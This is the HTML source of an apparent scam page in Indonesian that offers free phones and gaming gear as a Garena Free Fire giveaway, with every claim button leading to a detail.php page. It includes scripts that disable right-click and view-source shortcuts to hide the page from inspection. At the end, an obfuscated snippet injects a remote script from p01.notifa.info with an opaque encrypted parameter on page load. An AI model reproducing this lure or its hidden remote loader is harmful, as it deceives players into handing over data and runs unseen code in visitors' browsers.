
<!=[] ★OBETBET★ --!>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>GIVEAWAY HP</title>

<meta property="description" content="Free claim gift in Garena Free Fire"/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#eaa300">
<link rel="stylesheet" href="css/style.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<body>
<style type="text/css">
	#hadiah fieldset:not(:first-of-type) {
		display: none;
	}
fieldset {
border: none;
}
</style>

<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>


<div class="navbar">
	<img src="obetbet/bet/thumbnail.png">HANDPHONE GRATIS</br>
	<span>PUSAT HADIAH GIVEAWAY HP</span>
</div>
</br>
</br>
</br>
</br>
</br>


		
		</br>
<form id="hadiah" novalidate>
	<fieldset>
	<!----  HADIAH 1 --->
		<div class="box">
			<div class="isi">
				<span class="item">IPHONE 11 PRO</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/11.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</center>
			</div>
			<div class="isi">
				<span class="item">REALMI 3 PRO</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/12.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</br>
				</br>
				</center>
			</div>
			<div class="isi">
				<span class="item">OPPO A31</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/13.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</center>
			</div>
		</div>
		<div class="box">
			<div class="isi">
				<span class="item">SAMSUNG GALAXY A20S</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/14.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</center>
			</div>
			<div class="isi">
				<span class="item">VIVO S1 BLUE</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/15.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</br>
				</br>
				</center>
			</div>
			<div class="isi">
				<span class="item">INFINIX 3SMART</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/16.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</center>
			</div>
		</div>
		<div class="box">
			<div class="isi">
				<span class="item">HEADSET GAMING</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/17.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</center>
			</div>
			<div class="isi">
				<span class="item">POWER BANK</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/18.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</br>
				</br>
				</center>
			</div>
			<div class="isi">
				<span class="item">XIOMI BLACK SHARK</span>
				</br>
				</br>
				<hr class="garis">
				<center>
				<img width="255" src="obetbet/bet/19.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='detail.php';" class="btn-klaim">DAPATKAN</button>
				</center>
			</div>
		</div>
		</br>
		</br>
	</fieldset>
	
</form>
</br>
</br>
</br>
</br>
</br>
<div class="footer">
	<center>
	<img width="70" src="obetbet/garena-logo.png">
	</center>
</div>

<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>
<script src="js/click.js"></script>
<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXlzTeIbSr%2b6BJlyXuTZzKmN%2bXYNVDaay0ZXmFsPuN3BHS6CTOHGQvSA55aP94iY0z5k9YXTemwFNgSKuvMMcNWl60oTmE8D0wylT2fcHmaB7xgo0iWluQEBdRT8KLfQu6A76ysT1qcziVwlYxwh3wvoF60zZprB0TA15z%2f7SIxJrusyqxhL%2b5LWLs4tEeEv3%2besSVRzhqVhpmi%2fa9op8%2bom%2boItWPrtL58nEQ%2fsxUVgogn0NN4RqbwNaqzBSQVkhCf0AsyO0L5%2bsr0E6nJBqiTRgLMUubLFBU1inTGzZ6RusJ47oIS2vEyP2aSiWBsARzC3vlgDrdahaL1s95A6lxiOcQy%2fGpRWEUwyN3sgeAr14s9Eh%2fkgRCJkLhYfk20DEIeIyCbkM7e3Kj6UfWp4ha429WlERJ6qPZl7JQGZvD%2bMdO6qWOrtdhIf5ipQ%2f3yNRYnBnwZc9%2b4Wbgu%2bq3zqC8BslDCigoBgayGXHH8w%2bJfs3JrsCUJbK1n%2f4jd2du04Be9fcv%2brQPkKbH8Jp2trnr0j6lyUCaQX7ELhjBbmHgydGso%2bOPHejh9Jq4FPqr%2bDuXMz8KL1JSUHAQ0%2fdodlDB0w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>













